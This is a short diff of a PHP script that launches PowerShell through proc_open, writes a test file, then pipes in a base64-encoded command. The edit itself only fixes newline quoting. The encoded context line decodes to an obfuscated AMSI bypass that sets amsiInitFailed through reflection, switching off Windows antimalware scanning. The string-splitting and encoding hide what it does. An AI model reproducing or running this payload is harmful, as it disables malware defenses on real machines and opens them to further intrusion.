@@ -19,7 +19,7 @@ $descriptorspec = array(
 $process = proc_open('powershell', $descriptorspec, $pipes);
 
 if (is_resource($process)) {
-    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt\n');
+    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt'."\n");
     fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpJytbY2hhcl04NSsndGlscycpLkdldEZpZWxkKCdhbXMnK1tjaGFyXTEwNSsnSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKQokay5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCg==")."\n");
 
     sleep(5);
